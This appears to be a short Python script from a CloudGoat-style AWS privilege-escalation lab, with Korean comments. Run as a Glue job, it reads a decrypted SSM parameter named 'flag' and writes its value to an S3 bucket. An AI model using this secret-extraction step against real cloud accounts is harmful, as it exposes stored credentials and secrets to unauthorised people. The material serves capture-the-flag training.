import boto3
import json

def lambda_handler(event, context):
    ssm = boto3.client('ssm')
    s3 = boto3.client('s3')
    
    try:
        # SSM 파라미터에서 flag 읽기
        response = ssm.get_parameter(Name='flag', WithDecryption=True)
        flag = response['Parameter']['Value']
        
        # 결과를 S3에 저장
        s3.put_object(
            Bucket='cg-data-from-web-glue-privesc-cgidfmohi6zro5',
            Key='flag_result.txt',
            Body=f"Flag found: {flag}"
        )
        
        return {
            'statusCode': 200,
            'body': json.dumps('Flag retrieved and saved to S3')
        }
    except Exception as e:
        print(f"Error: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps(f'Error: {str(e)}')
        }

# Glue job에서 실행하기 위한 추가 코드
if __name__ == "__main__":
    lambda_handler({}, None)
